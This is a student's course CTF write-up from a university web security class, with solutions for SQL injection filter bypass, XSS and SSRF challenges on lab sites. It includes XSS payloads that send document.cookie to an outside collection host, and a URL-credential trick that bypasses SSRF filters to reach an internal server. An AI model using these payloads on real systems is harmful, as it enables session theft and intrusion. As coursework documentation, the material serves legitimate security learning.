<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>Course CTF: Week 9 &amp; 10 - COMP6443 Musings</title><meta name=renderer content=webkit><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content=no-transform><meta http-equiv=cache-control content=no-siteapp><meta name=theme-color content=#f8f5ec><meta name=msapplication-navbutton-color content=#f8f5ec><meta name=apple-mobile-web-app-capable content=yes><meta name=apple-mobile-web-app-status-bar-style content=#f8f5ec><meta name=author content=z5206677><meta name=description content="Pay Portal v2 Site: pay-portal-v2."><meta name=keywords content=Hugo,theme,even><meta name=generator content="Hugo 0.58.2 with theme even"><link rel=canonical href=../../../post/course-ctf/week9/><link rel=apple-touch-icon sizes=180x180 href=../../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../../favicon-16x16.png><link rel=manifest href=../../../manifest.json><link rel=mask-icon href=../../../safari-pinned-tab.svg color=#5bbad5><link href=../../../dist/even.c2a46f00.min.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><link rel=stylesheet href=../../../css/overrides.css><link rel=stylesheet href=../../../css/typedjs.shortcode.css><meta property=og:title content="Course CTF: Week 9 &amp; 10"><meta property=og:description content="Pay Portal v2 Site: pay-portal-v2."><meta property=og:type content=article><meta property=og:url content=/post/course-ctf/week9/><meta property=article:published_time content=2020-08-08T22:24:12+10:00><meta property=article:modified_time content=2020-08-08T22:24:12+10:00><meta itemprop=name content="Course CTF: Week 9 &amp; 10"><meta itemprop=description content="Pay Portal v2 Site: pay-portal-v2."><meta itemprop=datePublished content=2020-08-08T22:24:12&#43;10:00><meta itemprop=dateModified content=2020-08-08T22:24:12&#43;10:00><meta itemprop=wordCount content=780><meta itemprop=keywords content><meta name=twitter:card content=summary><meta name=twitter:title content="Course CTF: Week 9 &amp; 10"><meta name=twitter:description content="Pay Portal v2 Site: pay-portal-v2."><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script><script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=../../../ class=logo>COMP6443 Musings</a></div><div class=mobile-navbar-icon><span></span><span></span><span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=../../../><li class=mobile-menu-item>Home</li></a><a href=https://github.com/featherbear/UNSW-COMP6443><li class=mobile-menu-item>GitHub</li></a><a href=../../../categories/report><li class=mobile-menu-item>Report</li></a><a href=../../../categories/><li class=mobile-menu-item>Categories</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=../../../ class=logo>COMP6443 Musings</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=../../../>Home</a></li><li class=menu-item><a class=menu-item-link href=https://github.com/featherbear/UNSW-COMP6443>GitHub</a></li><li class=menu-item><a class=menu-item-link href=../../../categories/report>Report</a></li><li class=menu-item><a class=menu-item-link href=../../../categories/>Categories</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>Course CTF: Week 9 &amp; 10</h1><div class=post-meta><span class=post-time>2020-08-08</span><div class=post-category><a href=../../../categories/course-ctf/>Course CTF</a></div></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>Contents</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><ul><li><a href=#pay-portal-v2>Pay Portal v2</a></li><li><a href=#flag-printer>Flag Printer</a></li><li><a href=#science-tomorrow>Science Tomorrow</a><ul><li><a href=#reflected>Reflected</a></li><li><a href=#stored>Stored</a></li></ul></li><li><a href=#ctfproxy2-ssrf>CTFProxy2 SSRF</a></li></ul></li></ul></nav></div></div><div class=post-content><h2 id=pay-portal-v2>Pay Portal v2</h2><p>Site: pay-portal-v2.-QBSITE-</p><p>Sanitised strings:</p><ul><li><code>#</code></li><li><code>UNION</code></li><li><code>SELECT</code></li></ul><p>Filtered filtered strings</p><ul><li><code>payportal</code></li><li><code>--</code></li><li><code>OR ‎</code></li></ul><p>As both comment sequence characters are blocked (and <code>/*</code> doesn't work in this case) - we need to consider other ways to bypass the WAF.</p><p>Upon investigation, the <code>OR ‎</code> is only filtered when that appended space character is present.<br>We can therefore replace the space character with some other valid token - e.g a multiline comment <code>/**/</code>, or perhaps a bracket <code>(</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
</span></pre></td><td class=lntd><pre class=chroma>&#34;OR(1);</pre></td></tr></table></div></div><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h2 id=flag-printer>Flag Printer</h2><p>Site: flagprinter.-QBSITE-</p><p>flagprinter.-QBSITE- does not verify the shared proxy secret, so we can create another endpoint that directs to the flagprinter domain.</p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h2 id=science-tomorrow>Science Tomorrow</h2><p>Site: science-tomorrow-v2.-QBSITE-</p><h3 id=reflected>Reflected</h3><p>The WAF sanitises <code>img</code> and <code>onerror</code> keywords, and filters <code>fetch</code>.<br>However it does not wholistically perform sanitisation (it performs only one round of sanitisation), which allows us to craft a bypass</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
</span></pre></td><td class=lntd><pre class=chroma>&lt;iimgmg src=a ononerrorerror=this.src=&#34;https://my.collection.site/?x=&#34;+document.cookie &gt;</pre></td></tr></table></div></div><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h3 id=stored>Stored</h3><p>Well.. uh no change from the <a href=../week7/#stored-xss>previous exploit</a>...</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
</span></pre></td><td class=lntd><pre class=chroma>&lt;img src=a onerror=this.src=&#34;https://my.collection.site/?x=&#34;+document.cookie &gt;</pre></td></tr></table></div></div><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><hr><h2 id=ctfproxy2-ssrf>CTFProxy2 SSRF</h2><p>Site: ctfproxy2.-QBSITE-/me<br>Site: ctfproxy2.-QBSITE-/flag</p><p>Looking at the <code>robots.txt</code> file we gain knowledge of the page <code>/flag</code>.<br>However, we cannot get the flag unless we are an 'internal' user.</p><p>This will require some sort of SSRF or RCE...</p><p>In the <code>/me</code> page, we are able specify an address that the server will be used as the current user's avatar.<br>The profile picture must follow a few rules, as specified by the WAF filter code</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-python3 data-lang=python3><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python3 data-lang=python3><span class=n>url</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;avatar&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
<span class=k>if</span> <span class=ow>not</span> <span class=n>url</span><span class=o>.</span><span class=n>endswith</span><span class=p>(</span><span class=s2>&#34;.png&#34;</span><span class=p>):</span>
  <span class=n>flash</span><span class=p>(</span><span class=s2>&#34;Avatar must be png file!&#34;</span><span class=p>,</span> <span class=s2>&#34;danger&#34;</span><span class=p>)</span>
  <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s2>&#34;me&#34;</span><span class=p>))</span>
<span class=k>try</span><span class=p>:</span>
  <span class=n>blacklist</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;?&#39;</span><span class=p>,</span> <span class=s1>&#39;127.&#39;</span><span class=p>,</span> <span class=s1>&#39;localhost&#39;</span><span class=p>,</span> <span class=s1>&#39;0/&#39;</span><span class=p>,</span> <span class=s1>&#39;::&#39;</span><span class=p>,</span> <span class=s1>&#39;[&#39;</span><span class=p>,</span> <span class=s1>&#39;]&#39;</span><span class=p>]</span>
  <span class=k>for</span> <span class=n>w</span> <span class=ow>in</span> <span class=n>blacklist</span><span class=p>:</span>
    <span class=k>if</span> <span class=n>w</span> <span class=ow>in</span> <span class=n>url</span><span class=p>:</span>
      <span class=k>raise</span> <span class=ne>Exception</span><span class=p>(</span><span class=s2>&#34;&#39;</span><span class=si>%s</span><span class=s2>&#39; is dangerous&#34;</span> <span class=o>%</span> <span class=n>w</span><span class=p>)</span>
  <span class=k>try</span><span class=p>:</span>
    <span class=n>domain</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>match</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;^https?://([a-zA-Z0-9-_.]+)&#34;</span><span class=p>,</span> <span class=n>url</span><span class=p>)</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
  <span class=k>except</span> <span class=ne>IndexError</span><span class=p>:</span>
    <span class=k>raise</span> <span class=ne>Exception</span><span class=p>(</span><span class=s2>&#34;invalid url&#34;</span><span class=p>)</span>
  <span class=n>ip</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>gethostbyname</span><span class=p>(</span><span class=n>domain</span><span class=p>)</span>
  <span class=k>if</span> <span class=n>ipaddress</span><span class=o>.</span><span class=n>ip_address</span><span class=p>(</span><span class=n>unicode</span><span class=p>(</span><span class=n>ip</span><span class=p>))</span><span class=o>.</span><span class=n>is_private</span><span class=p>:</span>
    <span class=k>raise</span> <span class=ne>Exception</span><span class=p>(</span><span class=s2>&#34;it is forbidden to access internal server &#34;</span> <span class=o>+</span> <span class=n>ip</span><span class=p>)</span></code></pre></td></tr></table></div></div><p>In English terms...</p><ul><li>Address must end with <code>.png</code></li><li>Address does <strong>NOT</strong> contain<ul><li><code>?</code></li><li><code>127.</code></li><li><code>localhost</code></li><li><code>0/</code></li><li><code>::</code></li><li><code>[</code></li><li><code>]</code></li></ul></li><li>Match RE <code>https?://([a-zA-Z0-9-_.]+)</code><ul><li>Result capture group is not a private address</li></ul></li></ul><p><em>So how do we bypass them?</em></p><table><thead><tr><th align=left>Condition</th><th align=left>Bypass</th></tr></thead><tbody><tr><td align=left>URL ends with <code>.png</code></td><td align=left>Append <code>#.png</code> to the URI</td></tr><tr><td align=left>Address blacklist</td><td align=left>Find alternate machine address</td></tr><tr><td align=left>Regex Match</td><td align=left>-</td></tr><tr><td align=left>Non-Private Address</td><td align=left>Add dummy address as a URI credential</td></tr></tbody></table><p><strong>Append <code>#.png</code> to the URI</strong></p><p>Page anchors aren't considered part of a URI, and are not passed into the HTTP request - meaning they're ignored!<br>For example, if I visited <code>www.google.com/somePage#test</code>, I would actually be visiting <code>www.google.com/somePage</code></p><p><strong>Find alternate machine address</strong></p><p>In the event that the capture group is resolved to a private address, an error appears which contains the IP address.<br>This gives us another way to access the local machine (and ultimately the web server)</p><p><strong>Add dummy address as a URL credential</strong></p><p>A web URL usually follows the format <code>http(s)://website.com/path</code></p><p>However, there are cases where we can also pass through <code>Basic</code> authentication.<br><code>http(s)://username:password@website.com/path</code></p><p>The regex <code>https?://([a-zA-Z0-9-_.]+)</code> returns the first group of alphanumerical characters and/or <code>-_.</code><br>However this does not contain the <code>@</code> symbol.</p><p>Therefore if we use <code>https://username:password@website.com/path</code>, the regex match will return <code>username:password</code>, rather than <code>website.com</code>.<br>Since the matched group is then resolved, and checked if it is a private address - we need to pass some valid host that is public. Something like <code>https://google.com@website.com/path</code> would then return <code>google.com</code>, which resolves to a public address - bypassing the filter!</p><p>To suit the other criteria, we also need to append <code>#.png</code><br>This means that we now have a working WAF bypass technique.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
</span><span class=lnt>2
</span></pre></td><td class=lntd><pre class=chroma># Template Payload
https://google.com@TARGET/PATH#.png</pre></td></tr></table></div></div><p>We can then <strong><em>try</em></strong> get the flag with the payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
</span></pre></td><td class=lntd><pre class=chroma>https://google.com@ctfproxy2.-QBSITE-/flag#.png</pre></td></tr></table></div></div><p><strong><em>However</em></strong>, we are presented with <code>HTTP Error 418: I'm a teapot</code> from the WAF / Reverse proxy.<br>So we'll need to snoop around the internal company infrastructure to find other resources (Docker address of the <code>ctfproxy2</code> container!!!).</p><table><thead><tr><th align=left>Address</th><th align=left>Result</th></tr></thead><tbody><tr><td align=left><code>http://requestz.-QBSITE-#.png</code></td><td align=left>10.152.183.138</td></tr><tr><td align=left><code>http://ctfproxy2.-QBSITE-#.png</code></td><td align=left>10.152.183.138</td></tr><tr><td align=left><code>http://ctfproxy2#.png</code></td><td align=left>10.152.183.121</td></tr><tr><td align=left><code>https://google.com@10.152.183.121#.png</code></td><td align=left>No connection</td></tr><tr><td align=left><code>http://google.com@10.152.183.121#.png</code></td><td align=left>Page load</td></tr><tr><td align=left><code>http://google.com@10.152.183.121/flag#.png</code></td><td align=left>Flag!</td></tr></tbody></table><p>I first leaked the IP of <code>requestz.-QBSITE-</code> and <code>ctfproxy2.-QBSITE-</code>, which both returned the IP address <code>10.152.183.138</code>.<br>This IP address is the address of the reverse proxy, not what we want.</p><p>Since the containers were on the same Docker network, they would be accessible from their machine host name too.<br>By leaking the IP of <code>ctfproxy2</code>, we could get the IP address <code>10.152.183.121</code>.</p><p>We can now use our bypass payload to retrieve contents from that local server, and ultimately get the flag!</p><p>Note: The local server doesn't serve its content over HTTPS.<br>This is quite a common practice in industry, as the reverse proxy will manage the SSL/TLS bits.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
</span><span class=lnt>2
</span></pre></td><td class=lntd><pre class=chroma># Final Payload
http://google.com@10.152.183.121/flag#.png</pre></td></tr></table></div></div><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote></div><footer class=post-footer><nav class=post-nav><a class=prev href=../../../post/tut7/><i class="iconfont icon-left"></i><span class="prev-text nav-default">Tutorial 7 Notes</span>
<span class="prev-text nav-mobile">Prev</span></a>
<a class=next href=../../../post/report/report2/><span class="next-text nav-default">Report - Week 7-10</span>
<span class="next-text nav-mobile">Next</span>
<i class="iconfont icon-right"></i></a></nav></footer></article></div></div></main><footer id=footer class=footer><div class=social-links><a href=mailto:z5206677@student.unsw.edu.au class="iconfont icon-email" title=email></a><a href=https://www.linkedin.com/in/andrewjinmengwong/ class="iconfont icon-linkedin" title=linkedin></a><a href=https://github.com/featherbear class="iconfont icon-github" title=github></a><a href=https://www.instagram.com/_andrewjwong/ class="iconfont icon-instagram" title=instagram></a><a href=../../../index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a></div><div class=copyright><span class=power-by>Powered by <a class=hexo-link href=https://gohugo.io>Hugo</a></span>
<span class=division>|</span>
<span class=theme-info>Theme -
<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span>
<span class=copyright-year>&copy;
2020
<span class=heart><i class="iconfont icon-heart"></i></span><span class=author>Andrew Wong (z5206677)</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script><script type=text/javascript src=../../../dist/even.26188efa.min.js></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-107434487-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script src=../../../js/typed.js@2.0.9></script><script src=../../../js/typedjs.shortcode.js></script><script src=../../../js/offsite.js></script></body></html>